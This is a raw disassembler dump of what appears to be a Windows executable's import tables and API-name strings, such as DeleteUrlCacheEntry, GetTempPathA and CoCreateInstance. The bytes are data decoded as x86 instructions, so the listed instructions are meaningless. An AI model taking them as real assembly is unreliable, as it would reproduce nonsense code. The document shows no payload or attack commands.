  42d182:	02 00                	add    (%eax),%al
  42d184:	f8                   	clc
  42d185:	d6                   	salc
  42d186:	02 00                	add    (%eax),%al
  42d188:	10 d7                	adc    %dl,%bh
  42d18a:	02 00                	add    (%eax),%al
  42d18c:	1c d7                	sbb    $0xd7,%al
  42d18e:	02 00                	add    (%eax),%al
  42d190:	34 d7                	xor    $0xd7,%al
  42d192:	02 00                	add    (%eax),%al
  42d194:	44                   	inc    %esp
  42d195:	d7                   	xlat   %ds:(%ebx)
  42d196:	02 00                	add    (%eax),%al
  42d198:	54                   	push   %esp
  42d199:	d7                   	xlat   %ds:(%ebx)
  42d19a:	02 00                	add    (%eax),%al
  42d19c:	64 d7                	xlat   %fs:(%ebx)
  42d19e:	02 00                	add    (%eax),%al
  42d1a0:	74 d7                	je     0x42d179
  42d1a2:	02 00                	add    (%eax),%al
  42d1a4:	80 d7 02             	adc    $0x2,%bh
  42d1a7:	00 90 d7 02 00 a0    	add    %dl,-0x5ffffd29(%eax)
  42d1ad:	d7                   	xlat   %ds:(%ebx)
  42d1ae:	02 00                	add    (%eax),%al
  42d1b0:	ac                   	lods   %ds:(%esi),%al
  42d1b1:	d7                   	xlat   %ds:(%ebx)
  42d1b2:	02 00                	add    (%eax),%al
  42d1b4:	b8 d7 02 00 cc       	mov    $0xcc0002d7,%eax
  42d1b9:	d7                   	xlat   %ds:(%ebx)
  42d1ba:	02 00                	add    (%eax),%al
  42d1bc:	dc d7                	(bad)
  42d1be:	02 00                	add    (%eax),%al
  42d1c0:	e4 d7                	in     $0xd7,%al
  42d1c2:	02 00                	add    (%eax),%al
  42d1c4:	f8                   	clc
  42d1c5:	d7                   	xlat   %ds:(%ebx)
  42d1c6:	02 00                	add    (%eax),%al
  42d1c8:	08 d8                	or     %bl,%al
  42d1ca:	02 00                	add    (%eax),%al
  42d1cc:	1c d8                	sbb    $0xd8,%al
  42d1ce:	02 00                	add    (%eax),%al
  42d1d0:	34 d8                	xor    $0xd8,%al
  42d1d2:	02 00                	add    (%eax),%al
  42d1d4:	4c                   	dec    %esp
  42d1d5:	d8 02                	fadds  (%edx)
  42d1d7:	00 58 d8             	add    %bl,-0x28(%eax)
  42d1da:	02 00                	add    (%eax),%al
  42d1dc:	64 d8 02             	fadds  %fs:(%edx)
  42d1df:	00 70 d8             	add    %dh,-0x28(%eax)
  42d1e2:	02 00                	add    (%eax),%al
  42d1e4:	7c d8                	jl     0x42d1be
  42d1e6:	02 00                	add    (%eax),%al
  42d1e8:	8c d8                	mov    %ds,%eax
  42d1ea:	02 00                	add    (%eax),%al
	...
  42d1f4:	9c                   	pushf
  42d1f5:	d8 02                	fadds  (%edx)
  42d1f7:	00 b0 d8 02 00 c0    	add    %dh,-0x3ffffd28(%eax)
  42d1fd:	d8 02                	fadds  (%edx)
  42d1ff:	00 d0                	add    %dl,%al
  42d201:	d8 02                	fadds  (%edx)
  42d203:	00 dc                	add    %bl,%ah
  42d205:	d8 02                	fadds  (%edx)
  42d207:	00 ec                	add    %ch,%ah
  42d209:	d8 02                	fadds  (%edx)
  42d20b:	00 f8                	add    %bh,%al
  42d20d:	d8 02                	fadds  (%edx)
  42d20f:	00 10                	add    %dl,(%eax)
  42d211:	d9 02                	flds   (%edx)
  42d213:	00 20                	add    %ah,(%eax)
  42d215:	d9 02                	flds   (%edx)
  42d217:	00 2c d9             	add    %ch,(%ecx,%ebx,8)
  42d21a:	02 00                	add    (%eax),%al
  42d21c:	38 d9                	cmp    %bl,%cl
  42d21e:	02 00                	add    (%eax),%al
  42d220:	4c                   	dec    %esp
  42d221:	d9 02                	flds   (%edx)
  42d223:	00 5c d9 02          	add    %bl,0x2(%ecx,%ebx,8)
  42d227:	00 6c d9 02          	add    %ch,0x2(%ecx,%ebx,8)
  42d22b:	00 80 d9 02 00 94    	add    %al,-0x6bfffd27(%eax)
  42d231:	d9 02                	flds   (%edx)
  42d233:	00 a8 d9 02 00 bc    	add    %ch,-0x43fffd27(%eax)
  42d239:	d9 02                	flds   (%edx)
  42d23b:	00 d0                	add    %dl,%al
  42d23d:	d9 02                	flds   (%edx)
  42d23f:	00 e4                	add    %ah,%ah
  42d241:	d9 02                	flds   (%edx)
  42d243:	00 f8                	add    %bh,%al
  42d245:	d9 02                	flds   (%edx)
  42d247:	00 08                	add    %cl,(%eax)
  42d249:	da 02                	fiaddl (%edx)
  42d24b:	00 1c da             	add    %bl,(%edx,%ebx,8)
  42d24e:	02 00                	add    (%eax),%al
  42d250:	2c da                	sub    $0xda,%al
  42d252:	02 00                	add    (%eax),%al
  42d254:	40                   	inc    %eax
  42d255:	da 02                	fiaddl (%edx)
  42d257:	00 50 da             	add    %dl,-0x26(%eax)
  42d25a:	02 00                	add    (%eax),%al
  42d25c:	60                   	pusha
  42d25d:	da 02                	fiaddl (%edx)
  42d25f:	00 74 da 02          	add    %dh,0x2(%edx,%ebx,8)
	...
  42d26b:	00 88 da 02 00 9c    	add    %cl,-0x63fffd26(%eax)
  42d271:	da 02                	fiaddl (%edx)
  42d273:	00 ac da 02 00 bc da 	add    %ch,-0x2543fffe(%edx,%ebx,8)
  42d27a:	02 00                	add    (%eax),%al
  42d27c:	d4 da                	aam    $0xda
  42d27e:	02 00                	add    (%eax),%al
	...
  42d288:	e4 da                	in     $0xda,%al
  42d28a:	02 00                	add    (%eax),%al
  42d28c:	f8                   	clc
  42d28d:	da 02                	fiaddl (%edx)
  42d28f:	00 08                	add    %cl,(%eax)
  42d291:	db 02                	fildl  (%edx)
  42d293:	00 18                	add    %bl,(%eax)
  42d295:	db 02                	fildl  (%edx)
  42d297:	00 2c db             	add    %ch,(%ebx,%ebx,8)
  42d29a:	02 00                	add    (%eax),%al
  42d29c:	40                   	inc    %eax
  42d29d:	db 02                	fildl  (%edx)
  42d29f:	00 54 db 02          	add    %dl,0x2(%ebx,%ebx,8)
  42d2a3:	00 68 db             	add    %ch,-0x25(%eax)
  42d2a6:	02 00                	add    (%eax),%al
	...
  42d2b0:	7c db                	jl     0x42d28d
  42d2b2:	02 00                	add    (%eax),%al
  42d2b4:	8c db                	mov    %ds,%ebx
  42d2b6:	02 00                	add    (%eax),%al
  42d2b8:	98                   	cwtl
  42d2b9:	db 02                	fildl  (%edx)
  42d2bb:	00 a4 db 02 00 ac db 	add    %ah,-0x2453fffe(%ebx,%ebx,8)
  42d2c2:	02 00                	add    (%eax),%al
  42d2c4:	b4 db                	mov    $0xdb,%ah
  42d2c6:	02 00                	add    (%eax),%al
  42d2c8:	c0 db 02             	rcr    $0x2,%bl
  42d2cb:	00 cc                	add    %cl,%ah
  42d2cd:	db 02                	fildl  (%edx)
  42d2cf:	00 d8                	add    %bl,%al
  42d2d1:	db 02                	fildl  (%edx)
  42d2d3:	00 e0                	add    %ah,%al
  42d2d5:	db 02                	fildl  (%edx)
  42d2d7:	00 e8                	add    %ch,%al
  42d2d9:	db 02                	fildl  (%edx)
  42d2db:	00 f4                	add    %dh,%ah
  42d2dd:	db 02                	fildl  (%edx)
  42d2df:	00 00                	add    %al,(%eax)
  42d2e1:	dc 02                	faddl  (%edx)
  42d2e3:	00 08                	add    %cl,(%eax)
  42d2e5:	dc 02                	faddl  (%edx)
  42d2e7:	00 14 dc             	add    %dl,(%esp,%ebx,8)
  42d2ea:	02 00                	add    (%eax),%al
  42d2ec:	20 dc                	and    %bl,%ah
  42d2ee:	02 00                	add    (%eax),%al
  42d2f0:	2c dc                	sub    $0xdc,%al
  42d2f2:	02 00                	add    (%eax),%al
  42d2f4:	38 dc                	cmp    %bl,%ah
  42d2f6:	02 00                	add    (%eax),%al
	...
  42d300:	f4                   	hlt
  42d301:	d4 02                	aam    $0x2
  42d303:	00 08                	add    %cl,(%eax)
  42d305:	d5 02                	aad    $0x2
  42d307:	00 1c d5 02 00 2c d5 	add    %bl,-0x2ad3fffe(,%edx,8)
  42d30e:	02 00                	add    (%eax),%al
	...
  42d318:	40                   	inc    %eax
  42d319:	d5 02                	aad    $0x2
	...
  42d323:	00 54 d5 02          	add    %dl,0x2(%ebp,%edx,8)
  42d327:	00 6c d5 02          	add    %ch,0x2(%ebp,%edx,8)
  42d32b:	00 88 d5 02 00 00    	add    %cl,0x2d5(%eax)
  42d331:	00 00                	add    %al,(%eax)
  42d333:	00 00                	add    %al,(%eax)
  42d335:	00 00                	add    %al,(%eax)
  42d337:	00 a4 d5 02 00 b4 d5 	add    %ah,-0x2a4bfffe(%ebp,%edx,8)
  42d33e:	02 00                	add    (%eax),%al
  42d340:	d0 d5                	rcl    $1,%ch
  42d342:	02 00                	add    (%eax),%al
  42d344:	e4 d5                	in     $0xd5,%al
  42d346:	02 00                	add    (%eax),%al
  42d348:	fc                   	cld
  42d349:	d5 02                	aad    $0x2
  42d34b:	00 14 d6             	add    %dl,(%esi,%edx,8)
  42d34e:	02 00                	add    (%eax),%al
  42d350:	28 d6                	sub    %dl,%dh
  42d352:	02 00                	add    (%eax),%al
  42d354:	38 d6                	cmp    %dl,%dh
  42d356:	02 00                	add    (%eax),%al
  42d358:	50                   	push   %eax
  42d359:	d6                   	salc
  42d35a:	02 00                	add    (%eax),%al
  42d35c:	64 d6                	fs salc
  42d35e:	02 00                	add    (%eax),%al
  42d360:	74 d6                	je     0x42d338
  42d362:	02 00                	add    (%eax),%al
  42d364:	88 d6                	mov    %dl,%dh
  42d366:	02 00                	add    (%eax),%al
  42d368:	a0 d6 02 00 b0       	mov    0xb00002d6,%al
  42d36d:	d6                   	salc
  42d36e:	02 00                	add    (%eax),%al
  42d370:	c0 d6 02             	rcl    $0x2,%dh
  42d373:	00 d0                	add    %dl,%al
  42d375:	d6                   	salc
  42d376:	02 00                	add    (%eax),%al
  42d378:	e0 d6                	loopne 0x42d350
  42d37a:	02 00                	add    (%eax),%al
  42d37c:	f8                   	clc
  42d37d:	d6                   	salc
  42d37e:	02 00                	add    (%eax),%al
  42d380:	10 d7                	adc    %dl,%bh
  42d382:	02 00                	add    (%eax),%al
  42d384:	1c d7                	sbb    $0xd7,%al
  42d386:	02 00                	add    (%eax),%al
  42d388:	34 d7                	xor    $0xd7,%al
  42d38a:	02 00                	add    (%eax),%al
  42d38c:	44                   	inc    %esp
  42d38d:	d7                   	xlat   %ds:(%ebx)
  42d38e:	02 00                	add    (%eax),%al
  42d390:	54                   	push   %esp
  42d391:	d7                   	xlat   %ds:(%ebx)
  42d392:	02 00                	add    (%eax),%al
  42d394:	64 d7                	xlat   %fs:(%ebx)
  42d396:	02 00                	add    (%eax),%al
  42d398:	74 d7                	je     0x42d371
  42d39a:	02 00                	add    (%eax),%al
  42d39c:	80 d7 02             	adc    $0x2,%bh
  42d39f:	00 90 d7 02 00 a0    	add    %dl,-0x5ffffd29(%eax)
  42d3a5:	d7                   	xlat   %ds:(%ebx)
  42d3a6:	02 00                	add    (%eax),%al
  42d3a8:	ac                   	lods   %ds:(%esi),%al
  42d3a9:	d7                   	xlat   %ds:(%ebx)
  42d3aa:	02 00                	add    (%eax),%al
  42d3ac:	b8 d7 02 00 cc       	mov    $0xcc0002d7,%eax
  42d3b1:	d7                   	xlat   %ds:(%ebx)
  42d3b2:	02 00                	add    (%eax),%al
  42d3b4:	dc d7                	(bad)
  42d3b6:	02 00                	add    (%eax),%al
  42d3b8:	e4 d7                	in     $0xd7,%al
  42d3ba:	02 00                	add    (%eax),%al
  42d3bc:	f8                   	clc
  42d3bd:	d7                   	xlat   %ds:(%ebx)
  42d3be:	02 00                	add    (%eax),%al
  42d3c0:	08 d8                	or     %bl,%al
  42d3c2:	02 00                	add    (%eax),%al
  42d3c4:	1c d8                	sbb    $0xd8,%al
  42d3c6:	02 00                	add    (%eax),%al
  42d3c8:	34 d8                	xor    $0xd8,%al
  42d3ca:	02 00                	add    (%eax),%al
  42d3cc:	4c                   	dec    %esp
  42d3cd:	d8 02                	fadds  (%edx)
  42d3cf:	00 58 d8             	add    %bl,-0x28(%eax)
  42d3d2:	02 00                	add    (%eax),%al
  42d3d4:	64 d8 02             	fadds  %fs:(%edx)
  42d3d7:	00 70 d8             	add    %dh,-0x28(%eax)
  42d3da:	02 00                	add    (%eax),%al
  42d3dc:	7c d8                	jl     0x42d3b6
  42d3de:	02 00                	add    (%eax),%al
  42d3e0:	8c d8                	mov    %ds,%eax
  42d3e2:	02 00                	add    (%eax),%al
	...
  42d3ec:	9c                   	pushf
  42d3ed:	d8 02                	fadds  (%edx)
  42d3ef:	00 b0 d8 02 00 c0    	add    %dh,-0x3ffffd28(%eax)
  42d3f5:	d8 02                	fadds  (%edx)
  42d3f7:	00 d0                	add    %dl,%al
  42d3f9:	d8 02                	fadds  (%edx)
  42d3fb:	00 dc                	add    %bl,%ah
  42d3fd:	d8 02                	fadds  (%edx)
  42d3ff:	00 ec                	add    %ch,%ah
  42d401:	d8 02                	fadds  (%edx)
  42d403:	00 f8                	add    %bh,%al
  42d405:	d8 02                	fadds  (%edx)
  42d407:	00 10                	add    %dl,(%eax)
  42d409:	d9 02                	flds   (%edx)
  42d40b:	00 20                	add    %ah,(%eax)
  42d40d:	d9 02                	flds   (%edx)
  42d40f:	00 2c d9             	add    %ch,(%ecx,%ebx,8)
  42d412:	02 00                	add    (%eax),%al
  42d414:	38 d9                	cmp    %bl,%cl
  42d416:	02 00                	add    (%eax),%al
  42d418:	4c                   	dec    %esp
  42d419:	d9 02                	flds   (%edx)
  42d41b:	00 5c d9 02          	add    %bl,0x2(%ecx,%ebx,8)
  42d41f:	00 6c d9 02          	add    %ch,0x2(%ecx,%ebx,8)
  42d423:	00 80 d9 02 00 94    	add    %al,-0x6bfffd27(%eax)
  42d429:	d9 02                	flds   (%edx)
  42d42b:	00 a8 d9 02 00 bc    	add    %ch,-0x43fffd27(%eax)
  42d431:	d9 02                	flds   (%edx)
  42d433:	00 d0                	add    %dl,%al
  42d435:	d9 02                	flds   (%edx)
  42d437:	00 e4                	add    %ah,%ah
  42d439:	d9 02                	flds   (%edx)
  42d43b:	00 f8                	add    %bh,%al
  42d43d:	d9 02                	flds   (%edx)
  42d43f:	00 08                	add    %cl,(%eax)
  42d441:	da 02                	fiaddl (%edx)
  42d443:	00 1c da             	add    %bl,(%edx,%ebx,8)
  42d446:	02 00                	add    (%eax),%al
  42d448:	2c da                	sub    $0xda,%al
  42d44a:	02 00                	add    (%eax),%al
  42d44c:	40                   	inc    %eax
  42d44d:	da 02                	fiaddl (%edx)
  42d44f:	00 50 da             	add    %dl,-0x26(%eax)
  42d452:	02 00                	add    (%eax),%al
  42d454:	60                   	pusha
  42d455:	da 02                	fiaddl (%edx)
  42d457:	00 74 da 02          	add    %dh,0x2(%edx,%ebx,8)
	...
  42d463:	00 88 da 02 00 9c    	add    %cl,-0x63fffd26(%eax)
  42d469:	da 02                	fiaddl (%edx)
  42d46b:	00 ac da 02 00 bc da 	add    %ch,-0x2543fffe(%edx,%ebx,8)
  42d472:	02 00                	add    (%eax),%al
  42d474:	d4 da                	aam    $0xda
  42d476:	02 00                	add    (%eax),%al
	...
  42d480:	e4 da                	in     $0xda,%al
  42d482:	02 00                	add    (%eax),%al
  42d484:	f8                   	clc
  42d485:	da 02                	fiaddl (%edx)
  42d487:	00 08                	add    %cl,(%eax)
  42d489:	db 02                	fildl  (%edx)
  42d48b:	00 18                	add    %bl,(%eax)
  42d48d:	db 02                	fildl  (%edx)
  42d48f:	00 2c db             	add    %ch,(%ebx,%ebx,8)
  42d492:	02 00                	add    (%eax),%al
  42d494:	40                   	inc    %eax
  42d495:	db 02                	fildl  (%edx)
  42d497:	00 54 db 02          	add    %dl,0x2(%ebx,%ebx,8)
  42d49b:	00 68 db             	add    %ch,-0x25(%eax)
  42d49e:	02 00                	add    (%eax),%al
	...
  42d4a8:	7c db                	jl     0x42d485
  42d4aa:	02 00                	add    (%eax),%al
  42d4ac:	8c db                	mov    %ds,%ebx
  42d4ae:	02 00                	add    (%eax),%al
  42d4b0:	98                   	cwtl
  42d4b1:	db 02                	fildl  (%edx)
  42d4b3:	00 a4 db 02 00 ac db 	add    %ah,-0x2453fffe(%ebx,%ebx,8)
  42d4ba:	02 00                	add    (%eax),%al
  42d4bc:	b4 db                	mov    $0xdb,%ah
  42d4be:	02 00                	add    (%eax),%al
  42d4c0:	c0 db 02             	rcr    $0x2,%bl
  42d4c3:	00 cc                	add    %cl,%ah
  42d4c5:	db 02                	fildl  (%edx)
  42d4c7:	00 d8                	add    %bl,%al
  42d4c9:	db 02                	fildl  (%edx)
  42d4cb:	00 e0                	add    %ah,%al
  42d4cd:	db 02                	fildl  (%edx)
  42d4cf:	00 e8                	add    %ch,%al
  42d4d1:	db 02                	fildl  (%edx)
  42d4d3:	00 f4                	add    %dh,%ah
  42d4d5:	db 02                	fildl  (%edx)
  42d4d7:	00 00                	add    %al,(%eax)
  42d4d9:	dc 02                	faddl  (%edx)
  42d4db:	00 08                	add    %cl,(%eax)
  42d4dd:	dc 02                	faddl  (%edx)
  42d4df:	00 14 dc             	add    %dl,(%esp,%ebx,8)
  42d4e2:	02 00                	add    (%eax),%al
  42d4e4:	20 dc                	and    %bl,%ah
  42d4e6:	02 00                	add    (%eax),%al
  42d4e8:	2c dc                	sub    $0xdc,%al
  42d4ea:	02 00                	add    (%eax),%al
  42d4ec:	38 dc                	cmp    %bl,%ah
  42d4ee:	02 00                	add    (%eax),%al
  42d4f0:	00 00                	add    %al,(%eax)
  42d4f2:	00 00                	add    %al,(%eax)
  42d4f4:	6a 00                	push   $0x0
  42d4f6:	43                   	inc    %ebx
  42d4f7:	6f                   	outsl  %ds:(%esi),(%dx)
  42d4f8:	43                   	inc    %ebx
  42d4f9:	72 65                	jb     0x42d560
  42d4fb:	61                   	popa
  42d4fc:	74 65                	je     0x42d563
  42d4fe:	49                   	dec    %ecx
  42d4ff:	6e                   	outsb  %ds:(%esi),(%dx)
  42d500:	73 74                	jae    0x42d576
  42d502:	61                   	popa
  42d503:	6e                   	outsb  %ds:(%esi),(%dx)
  42d504:	63 65 00             	arpl   %esp,0x0(%ebp)
  42d507:	00 7c 00 43          	add    %bh,0x43(%eax,%eax,1)
  42d50b:	4c                   	dec    %esp
  42d50c:	53                   	push   %ebx
  42d50d:	49                   	dec    %ecx
  42d50e:	44                   	inc    %esp
  42d50f:	46                   	inc    %esi
  42d510:	72 6f                	jb     0x42d581
  42d512:	6d                   	insl   (%dx),%es:(%edi)
  42d513:	53                   	push   %ebx
  42d514:	74 72                	je     0x42d588
  42d516:	69 6e 67 00 00 00 58 	imul   $0x58000000,0x67(%esi),%ebp
  42d51d:	00 43 6f             	add    %al,0x6f(%ebx)
  42d520:	49                   	dec    %ecx
  42d521:	6e                   	outsb  %ds:(%esi),(%dx)
  42d522:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  42d529:	65 
  42d52a:	00 00                	add    %al,(%eax)
  42d52c:	5b                   	pop    %ebx
  42d52d:	00 43 6f             	add    %al,0x6f(%ebx)
  42d530:	55                   	push   %ebp
  42d531:	6e                   	outsb  %ds:(%esi),(%dx)
  42d532:	69 6e 69 74 69 61 6c 	imul   $0x6c616974,0x69(%esi),%ebp
  42d539:	69 7a 65 00 00 00 00 	imul   $0x0,0x65(%edx),%edi
  42d540:	46                   	inc    %esi
  42d541:	00 53 79             	add    %dl,0x79(%ebx)
  42d544:	73 41                	jae    0x42d587
  42d546:	6c                   	insb   (%dx),%es:(%edi)
  42d547:	6c                   	insb   (%dx),%es:(%edi)
  42d548:	6f                   	outsl  %ds:(%esi),(%dx)
  42d549:	63 53 74             	arpl   %edx,0x74(%ebx)
  42d54c:	72 69                	jb     0x42d5b7
  42d54e:	6e                   	outsb  %ds:(%esi),(%dx)
  42d54f:	67 00 00             	add    %al,(%bx,%si)
  42d552:	00 00                	add    %al,(%eax)
  42d554:	0b 00                	or     (%eax),%eax
  42d556:	44                   	inc    %esp
  42d557:	65 6c                	gs insb (%dx),%es:(%edi)
  42d559:	65 74 65             	gs je  0x42d5c1
  42d55c:	55                   	push   %ebp
  42d55d:	72 6c                	jb     0x42d5cb
  42d55f:	43                   	inc    %ebx
  42d560:	61                   	popa
  42d561:	63 68 65             	arpl   %ebp,0x65(%eax)
  42d564:	45                   	inc    %ebp
  42d565:	6e                   	outsb  %ds:(%esi),(%dx)
  42d566:	74 72                	je     0x42d5da
  42d568:	79 00                	jns    0x42d56a
  42d56a:	00 00                	add    %al,(%eax)
  42d56c:	15 00 46 69 6e       	adc    $0x6e694600,%eax
  42d571:	64 46                	fs inc %esi
  42d573:	69 72 73 74 55 72 6c 	imul   $0x6c725574,0x73(%edx),%esi
  42d57a:	43                   	inc    %ebx
  42d57b:	61                   	popa
  42d57c:	63 68 65             	arpl   %ebp,0x65(%eax)
  42d57f:	45                   	inc    %ebp
  42d580:	6e                   	outsb  %ds:(%esi),(%dx)
  42d581:	74 72                	je     0x42d5f5
  42d583:	79 41                	jns    0x42d5c6
  42d585:	00 00                	add    %al,(%eax)
  42d587:	00 1c 00             	add    %bl,(%eax,%eax,1)
  42d58a:	46                   	inc    %esi
  42d58b:	69 6e 64 4e 65 78 74 	imul   $0x7478654e,0x64(%esi),%ebp
  42d592:	55                   	push   %ebp
  42d593:	72 6c                	jb     0x42d601
  42d595:	43                   	inc    %ebx
  42d596:	61                   	popa
  42d597:	63 68 65             	arpl   %ebp,0x65(%eax)
  42d59a:	45                   	inc    %ebp
  42d59b:	6e                   	outsb  %ds:(%esi),(%dx)
  42d59c:	74 72                	je     0x42d610
  42d59e:	79 41                	jns    0x42d5e1
  42d5a0:	00 00                	add    %al,(%eax)
  42d5a2:	00 00                	add    %al,(%eax)
  42d5a4:	81 00 45 78 69 74    	addl   $0x74697845,(%eax)
  42d5aa:	50                   	push   %eax
  42d5ab:	72 6f                	jb     0x42d61c
  42d5ad:	63 65 73             	arpl   %esp,0x73(%ebp)
  42d5b0:	73 00                	jae    0x42d5b2
  42d5b2:	00 00                	add    %al,(%eax)
  42d5b4:	83 00 45             	addl   $0x45,(%eax)
  42d5b7:	78 70                	js     0x42d629
  42d5b9:	61                   	popa
  42d5ba:	6e                   	outsb  %ds:(%esi),(%dx)
  42d5bb:	64 45                	fs inc %ebp
  42d5bd:	6e                   	outsb  %ds:(%esi),(%dx)
  42d5be:	76 69                	jbe    0x42d629
  42d5c0:	72 6f                	jb     0x42d631
  42d5c2:	6e                   	outsb  %ds:(%esi),(%dx)
  42d5c3:	6d                   	insl   (%dx),%es:(%edi)
  42d5c4:	65 6e                	outsb  %gs:(%esi),(%dx)
  42d5c6:	74 53                	je     0x42d61b
  42d5c8:	74 72                	je     0x42d63c
  42d5ca:	69 6e 67 73 41 00 ca 	imul   $0xca004173,0x67(%esi),%ebp
  42d5d1:	00 47 65             	add    %al,0x65(%edi)
  42d5d4:	74 43                	je     0x42d619
  42d5d6:	6f                   	outsl  %ds:(%esi),(%dx)
  42d5d7:	6d                   	insl   (%dx),%es:(%edi)
  42d5d8:	6d                   	insl   (%dx),%es:(%edi)
  42d5d9:	61                   	popa
  42d5da:	6e                   	outsb  %ds:(%esi),(%dx)
  42d5db:	64 4c                	fs dec %esp
  42d5dd:	69 6e 65 41 00 00 00 	imul   $0x41,0x65(%esi),%ebp
  42d5e4:	de 00                	fiadds (%eax)
  42d5e6:	47                   	inc    %edi
  42d5e7:	65 74 43             	gs je  0x42d62d
  42d5ea:	75 72                	jne    0x42d65e
  42d5ec:	72 65                	jb     0x42d653
  42d5ee:	6e                   	outsb  %ds:(%esi),(%dx)
  42d5ef:	74 50                	je     0x42d641
  42d5f1:	72 6f                	jb     0x42d662
  42d5f3:	63 65 73             	arpl   %esp,0x73(%ebp)
  42d5f6:	73 49                	jae    0x42d641
  42d5f8:	64 00 00             	add    %al,%fs:(%eax)
  42d5fb:	00 e0                	add    %ah,%al
  42d5fd:	00 47 65             	add    %al,0x65(%edi)
  42d600:	74 43                	je     0x42d645
  42d602:	75 72                	jne    0x42d676
  42d604:	72 65                	jb     0x42d66b
  42d606:	6e                   	outsb  %ds:(%esi),(%dx)
  42d607:	74 54                	je     0x42d65d
  42d609:	68 72 65 61 64       	push   $0x64616572
  42d60e:	49                   	dec    %ecx
  42d60f:	64 00 00             	add    %al,%fs:(%eax)
  42d612:	00 00                	add    %al,(%eax)
  42d614:	f2 00 47 65          	repnz add %al,0x65(%edi)
  42d618:	74 45                	je     0x42d65f
  42d61a:	78 69                	js     0x42d685
  42d61c:	74 43                	je     0x42d661
  42d61e:	6f                   	outsl  %ds:(%esi),(%dx)
  42d61f:	64 65 54             	fs gs push %esp
  42d622:	68 72 65 61 64       	push   $0x64616572
  42d627:	00 f8                	add    %bh,%al
  42d629:	00 47 65             	add    %al,0x65(%edi)
  42d62c:	74 46                	je     0x42d674
  42d62e:	69 6c 65 53 69 7a 65 	imul   $0x657a69,0x53(%ebp,%eiz,2),%ebp
  42d635:	00 
  42d636:	00 00                	add    %al,(%eax)
  42d638:	0a 01                	or     (%ecx),%al
  42d63a:	47                   	inc    %edi
  42d63b:	65 74 4d             	gs je  0x42d68b
  42d63e:	6f                   	outsl  %ds:(%esi),(%dx)
  42d63f:	64 75 6c             	fs jne 0x42d6ae
  42d642:	65 46                	gs inc %esi
  42d644:	69 6c 65 4e 61 6d 65 	imul   $0x41656d61,0x4e(%ebp,%eiz,2),%ebp
  42d64b:	41 
  42d64c:	00 00                	add    %al,(%eax)
  42d64e:	00 00                	add    %al,(%eax)
  42d650:	0c 01                	or     $0x1,%al
  42d652:	47                   	inc    %edi
  42d653:	65 74 4d             	gs je  0x42d6a3
  42d656:	6f                   	outsl  %ds:(%esi),(%dx)
  42d657:	64 75 6c             	fs jne 0x42d6c6
  42d65a:	65 48                	gs dec %eax
  42d65c:	61                   	popa
  42d65d:	6e                   	outsb  %ds:(%esi),(%dx)
  42d65e:	64 6c                	fs insb (%dx),%es:(%edi)
  42d660:	65 41                	gs inc %ecx
  42d662:	00 00                	add    %al,(%eax)
  42d664:	1b 00                	sbb    (%eax),%eax
  42d666:	43                   	inc    %ebx
  42d667:	6c                   	insb   (%dx),%es:(%edi)
  42d668:	6f                   	outsl  %ds:(%esi),(%dx)
  42d669:	73 65                	jae    0x42d6d0
  42d66b:	48                   	dec    %eax
  42d66c:	61                   	popa
  42d66d:	6e                   	outsb  %ds:(%esi),(%dx)
  42d66e:	64 6c                	fs insb (%dx),%es:(%edi)
  42d670:	65 00 00             	add    %al,%gs:(%eax)
  42d673:	00 22                	add    %ah,(%edx)
  42d675:	01 47 65             	add    %eax,0x65(%edi)
  42d678:	74 50                	je     0x42d6ca
  42d67a:	72 6f                	jb     0x42d6eb
  42d67c:	63 41 64             	arpl   %eax,0x64(%ecx)
  42d67f:	64 72 65             	fs jb  0x42d6e7
  42d682:	73 73                	jae    0x42d6f7
  42d684:	00 00                	add    %al,(%eax)
  42d686:	00 00                	add    %al,(%eax)
  42d688:	3f                   	aas
  42d689:	01 47 65             	add    %eax,0x65(%edi)
  42d68c:	74 53                	je     0x42d6e1
  42d68e:	79 73                	jns    0x42d703
  42d690:	74 65                	je     0x42d6f7
  42d692:	6d                   	insl   (%dx),%es:(%edi)
  42d693:	44                   	inc    %esp
  42d694:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  42d69b:	79 41                	jns    0x42d6de
  42d69d:	00 00                	add    %al,(%eax)
  42d69f:	00 4d 01             	add    %cl,0x1(%ebp)
  42d6a2:	47                   	inc    %edi
  42d6a3:	65 74 54             	gs je  0x42d6fa
  42d6a6:	65 6d                	gs insl (%dx),%es:(%edi)
  42d6a8:	70 50                	jo     0x42d6fa
  42d6aa:	61                   	popa
  42d6ab:	74 68                	je     0x42d715
  42d6ad:	41                   	inc    %ecx
  42d6ae:	00 00                	add    %al,(%eax)
  42d6b0:	55                   	push   %ebp
  42d6b1:	01 47 65             	add    %eax,0x65(%edi)
  42d6b4:	74 54                	je     0x42d70a
  42d6b6:	69 63 6b 43 6f 75 6e 	imul   $0x6e756f43,0x6b(%ebx),%esp
  42d6bd:	74 00                	je     0x42d6bf
  42d6bf:	00 5c 01 47          	add    %bl,0x47(%ecx,%eax,1)
  42d6c3:	65 74 56             	gs je  0x42d71c
  42d6c6:	65 72 73             	gs jb  0x42d73c
  42d6c9:	69 6f 6e 00 00 00 00 	imul   $0x0,0x6e(%edi),%ebp
  42d6d0:	5d                   	pop    %ebp
  42d6d1:	01 47 65             	add    %eax,0x65(%edi)
  42d6d4:	74 56                	je     0x42d72c
  42d6d6:	65 72 73             	gs jb  0x42d74c
  42d6d9:	69 6f 6e 45 78 41 00 	imul   $0x417845,0x6e(%edi),%ebp
  42d6e0:	65 01 47 65          	add    %eax,%gs:0x65(%edi)
  42d6e4:	74 57                	je     0x42d73d
  42d6e6:	69 6e 64 6f 77 73 44 	imul   $0x4473776f,0x64(%esi),%ebp
  42d6ed:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  42d6f4:	79 41                	jns    0x42d737
  42d6f6:	00 00                	add    %al,(%eax)
  42d6f8:	76 01                	jbe    0x42d6fb
  42d6fa:	47                   	inc    %edi
  42d6fb:	6c                   	insb   (%dx),%es:(%edi)
  42d6fc:	6f                   	outsl  %ds:(%esi),(%dx)
  42d6fd:	62 61 6c             	bound  %esp,0x6c(%ecx)
  42d700:	4d                   	dec    %ebp
  42d701:	65 6d                	gs insl (%dx),%es:(%edi)
  42d703:	6f                   	outsl  %ds:(%esi),(%dx)
  42d704:	72 79                	jb     0x42d77f
  42d706:	53                   	push   %ebx
  42d707:	74 61                	je     0x42d76a
  42d709:	74 75                	je     0x42d780
  42d70b:	73 00                	jae    0x42d70d
  42d70d:	00 00                	add    %al,(%eax)
  42d70f:	00 25 00 43 6f 70    	add    %ah,0x706f4300
